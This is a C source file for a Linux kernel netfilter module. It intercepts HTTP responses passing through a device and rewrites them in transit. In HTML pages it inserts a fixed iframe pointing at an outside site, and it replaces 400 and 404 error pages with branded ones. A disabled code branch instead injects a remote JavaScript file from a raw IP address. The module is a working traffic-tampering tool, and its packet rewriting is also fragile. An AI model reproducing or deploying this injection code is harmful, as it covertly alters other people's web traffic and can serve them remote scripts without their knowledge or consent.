/*
 * =====================================================================================
 *
 *       Filename:  nf_http_modify.c
 *
 *    Description:  Modify netfilter modify mechine
 *
 *        Version:  1.0
 *        Created:  09/20/2016 02:04:06 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Lin Hui (Link), linhui.568@163.com
 *        Company:  
 *
 * =====================================================================================
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_ecache.h>

#include<linux/string.h>

#define TEST_DEBUG              (1)
#define HTTP_RESP_STR_LEN       (12)


static const unsigned char http_200_str[HTTP_RESP_STR_LEN] = 
    {0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30};

static const unsigned char http_400_str[HTTP_RESP_STR_LEN] = 
    {0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x34, 0x30, 0x30};

static const unsigned char http_404_str[HTTP_RESP_STR_LEN] = 
    {0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x34, 0x30, 0x34};

static const unsigned char http_400_web[] =
{
"HTTP/1.1 400 Bad request\r\n\
Content-Type: text/html\r\n\
Content-Length:875\r\n\
Connection: close\r\n\
\r\n\
<html><head><title>Web Not Found</title>\
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\
<style type=\"text/css\">\
body{font-family:'Courgette',ursive;background:#f3f3d1;}\
.wrap{margin:0 auto;width:1000px;}\
.logo{margin-top:50px;}\
.logo h1{font-size:200px;color:#8F8E8C;text-align:center;margin-bottom:1px;text-shadow:1px 1px 6px #fff;}\
.logo p{color:rgb(228, 146, 162);font-size:20px;margin-top:1px;text-align:center;}\
.sub a{color:black;background:#a0cE8C;text-decoration:none;padding:7px 120px;font-size:16px;font-family: arial, serif;\
font-weight:bold;-webkit-border-radius:3em;-moz-border-radius:.1em;-border-radius:.1em;}\
</style></head>\
<body><div class=\"wrap\"><div class=\"logo\">\
<h1>400</h1><p>你访问的页面出错了--页面请求错误!</p><br>\
<div class=\"sub\"><p><a href=\"http://www.ecpark.cn/\">车智汇官网</a></p></div>\
</div></div></body></html>"
};

static const unsigned char http_404_web[] =
{
"HTTP/1.1 404 Not Found\r\n\
Content-Type: text/html\r\n\
Content-Length:875\r\n\
Connection: close\r\n\
\r\n\
<html><head><title>Web Not Found</title>\
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\
<style type=\"text/css\">\
body{font-family:'Courgette',ursive;background:#f3f3d1;}\
.wrap{margin:0 auto;width:1000px;}\
.logo{margin-top:50px;}\
.logo h1{font-size:200px;color:#8F8E8C;text-align:center;margin-bottom:1px;text-shadow:1px 1px 6px #fff;}\
.logo p{color:rgb(228, 146, 162);font-size:20px;margin-top:1px;text-align:center;}\
.sub a{color:black;background:#a0cE8C;text-decoration:none;padding:7px 120px;font-size:16px;font-family: arial, serif;\
font-weight:bold;-webkit-border-radius:3em;-moz-border-radius:.1em;-border-radius:.1em;}\
</style></head>\
<body><div class=\"wrap\"><div class=\"logo\">\
<h1>404</h1><p>你访问的页面出错了--页面资源不存在</p><br>\
<div class=\"sub\"><p><a href=\"http://www.ecpark.cn/\">车智汇官网</a></p></div>\
</div></div></body></html>"
};

static const char bottomNav[] = 
{
"<style type=\"text/css\">#ad01ym{position:fixed;bottom:0;left:0;width:100%;overflow:visible;}</style>\
<iframe height=\"50\" id=\"ad01ym\" src=\"http://www.ecpark.cn/\"></iframe>"
};

void ip_v4_pack_checksum(
        struct sk_buff *skb,
        struct iphdr *iph, 
        struct tcphdr *tcph, 
        short ip_totlen)
{
    int tcplen;

    iph->tot_len = htons(ip_totlen);

    /* calc check sum */
    tcplen = ntohs(iph->tot_len) - (iph->ihl << 2);
    tcph->check = 0;
    tcph->check = tcp_v4_check(tcplen, iph->saddr, iph->daddr,
            csum_partial((unsigned char *)tcph, tcplen, 0));
    skb->ip_summed = CHECKSUM_NONE;
    iph->check = 0;
    ip_send_check(iph);
}


void adv_insert(
        struct sk_buff *skb,
        struct iphdr *iph,
        struct tcphdr *tcph,
        int tcpip_len, 
        int http_len,
        char *http_data)
{
    unsigned int i, len, tmp = 0;
    int ishtml = 0, isgzip = 0;
    int DOCstart = 0, DOCend = 0;
    int freelen;
    char headstr[] = "<!DOCTYPE html><html>";

#if 1
    const char *jsstr = bottomNav;
#else
    char jsstr[] = {"<script src=\"http://120.25.147.157:3579/jq142/a/click.js\"></script>"};
#endif

    int jslen = strlen(jsstr);
    int headlen = strlen(headstr);

    http_data = skb->data + iph->ihl*4 + tcph->doff*4; 

    len = http_len > 1024 ? 1024 : http_len;
    for(i=0;i<len;i++)
    {
        if(!memcmp(&http_data[i],"text/html\r\n",strlen("text/html\r\n")))
            ishtml = i;
        if(!memcmp(&http_data[i],"gzip",strlen("gzip")))
            isgzip = i;
        if(!memcmp(&http_data[i],"<!DOCTYPE",strlen("<!DOCTYPE")))
            DOCstart = i;
        if(!memcmp(&http_data[i],"<head",strlen("<head")))
        {
            DOCend = i;
            break;
        }
    }

    if ((ishtml != 0) && 
            (isgzip == 0) && 
            (DOCstart != 0) && 
            (DOCend != 0) && 
            (DOCstart != DOCend)
        )
    {
        tmp = DOCend - DOCstart;
#if TEST_DEBUG
        printk("DOC:%d, jslen:%d, headlen:%d\n", tmp, jslen, headlen);
#endif

        if (tmp >= (jslen + headlen))
        {
            memset(&http_data[DOCstart], ' ', tmp);
            memcpy(&http_data[DOCstart], headstr, headlen);
            memcpy(&http_data[DOCstart + headlen], jsstr, jslen);

            ip_v4_pack_checksum(skb, iph, tcph, skb->len);
#if TEST_DEBUG
            printk("=================================\n");
#endif
            return;
        }

        /* add skb buffer length */
        freelen = (skb->end - skb->tail);
        if ((freelen + tmp) > (jslen + headlen))
        {
            printk("Free:%d", freelen);
            freelen = jslen + headlen - tmp; 
            skb_put(skb, freelen);

            /* Insert iframe data */
            memmove(&http_data[DOCstart + freelen], &http_data[DOCstart], http_len - DOCstart);
            memcpy(&http_data[DOCstart], headstr, headlen);
            memcpy(&http_data[DOCstart + headlen], jsstr, jslen);

            ip_v4_pack_checksum(skb, iph, tcph, tcpip_len + http_len + freelen);
#if TEST_DEBUG
            printk("+++++++++++++++++++++++++++++++++++++++\n\n");
#endif
        }
    }
}

int http_error_response_modify(
        struct sk_buff *skb,
        struct iphdr *iph,
        struct tcphdr *tcph,
        int tcpip_len, 
        int http_len,
        char *http_data,
        unsigned int error_id)
{
    int web_len;

    if (error_id == 400)
        web_len = sizeof(http_400_web);
    else if (error_id == 404)
        web_len = sizeof(http_404_web);
    else
        return 0;

#if TEST_DEBUG
    printk("skb len:%d, head:%d, data:%d, web len:%d, error:%d\n", 
            skb->len, tcpip_len, http_len, web_len, error_id);
#endif           

    /* Malloc more data */
    if (web_len > http_len)
        skb_put(skb, web_len - http_len);

    /* backfill skb buffer data, which contained 400 or 404 http error file */
    if (error_id == 400)
        memcpy(http_data, http_400_web, web_len);
    else if (error_id == 404)
        memcpy(http_data, http_404_web, web_len);

    ip_v4_pack_checksum(skb, iph, tcph, tcpip_len + web_len);

    return 0;
}


static unsigned int nf_hook_change(
        unsigned int hooknum,
        struct sk_buff *skb,
        const struct net_device *in,
        const struct net_device *out,
        int (*okfn)(struct sk_buff*))
{
    int tcpip_len = 0;
    int http_len = 0;
    char *http_data = NULL;
    struct tcphdr *tcph = NULL;
    struct iphdr *iph = ip_hdr(skb);

    if (iph->protocol == IPPROTO_TCP)
    {
        tcph = tcp_hdr(skb);
        if ((tcph->source == htons(8080) || tcph->source == htons(80)))
        {
            tcpip_len = (iph->ihl + tcph->doff) << 2;
            http_len = ntohs(iph->tot_len) - tcpip_len;
            http_data = skb->data + tcpip_len; 

            if ((http_len >= 12))
            {
                if (strncmp(http_data, http_200_str, HTTP_RESP_STR_LEN) == 0)
                {
                    /* http 200 response package and data more than 100, include 200 response info,
                     * Content-Type: text/html\r\n, Content-Length: xxx\r\n, and html file data */
                    if (http_len > 100)
                        adv_insert(skb, iph, tcph, tcpip_len, http_len, http_data);
                }
                else if (strncmp(http_data, http_400_str, 12) == 0)
                {
                    http_error_response_modify(skb, iph, tcph, tcpip_len, http_len, http_data, 400);
                }
                else if (strncmp(http_data, http_404_str, 12) == 0)
                {
                    http_error_response_modify(skb, iph, tcph, tcpip_len, http_len, http_data, 404);
                }
            }
        }
    }
    return NF_ACCEPT;
}


static struct nf_hook_ops nf_http_out =
{
    .hook = nf_hook_change,
    .hooknum = NF_INET_PRE_ROUTING, 
    .priority = NF_IP_PRI_MANGLE,
    .pf = PF_INET                  
};

static int __init nf_http_init(void)
{
    nf_register_hook(&nf_http_out);
    return 0;
}

static void __exit nf_http_exit(void)
{
    nf_unregister_hook(&nf_http_out);
}

module_init(nf_http_init);
module_exit(nf_http_exit);
MODULE_LICENSE("GPL");

